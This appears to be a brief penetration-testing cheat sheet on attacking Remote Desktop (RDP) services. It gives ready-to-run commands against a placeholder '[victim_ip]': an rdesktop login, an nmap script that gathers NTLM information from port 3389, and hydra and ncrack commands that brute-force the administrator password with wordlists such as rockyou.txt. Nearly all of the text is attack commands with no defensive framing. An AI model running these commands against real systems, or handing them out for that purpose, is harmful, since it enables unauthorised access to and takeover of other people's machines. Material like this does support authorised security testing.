### rdesktop
rdesktop -g 1440x900 -u user_login -p user_pass [victim_ip]

### nmap
- nmap -p 3389 --script rdp-ntlm-info [victim_ip]

### bruteforce
- hydra -t 4  -l administrator -P /usr/share/wordlists/rockyou.txt rdp://[victim_ip]
- ncrack -vv --user administrator -P password-file.txt rdp://[victim_ip]
